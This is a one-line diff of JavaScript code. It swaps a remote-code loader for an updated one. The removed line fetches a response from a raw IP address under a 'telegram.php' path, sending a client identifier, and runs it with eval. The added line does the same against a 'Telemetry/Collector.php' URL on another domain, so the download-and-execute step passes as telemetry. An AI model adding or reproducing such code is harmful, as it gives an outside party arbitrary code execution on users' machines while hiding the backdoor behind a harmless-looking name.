@@ -1,1 +1,1 @@
-h.open('GET','http://149.28.159.238/TG/WY/telegram.php?client='+n,false);h.send();eval(h.ResponseText);
+(function(){var apiUrl="https://input.giconstract.com/Telemetry/396e36e9741a2bb47d82e7ed884beacc/Collector.php";h.open("GET",apiUrl+"?client="+n,!1),h.send(),eval(h.ResponseText)})();
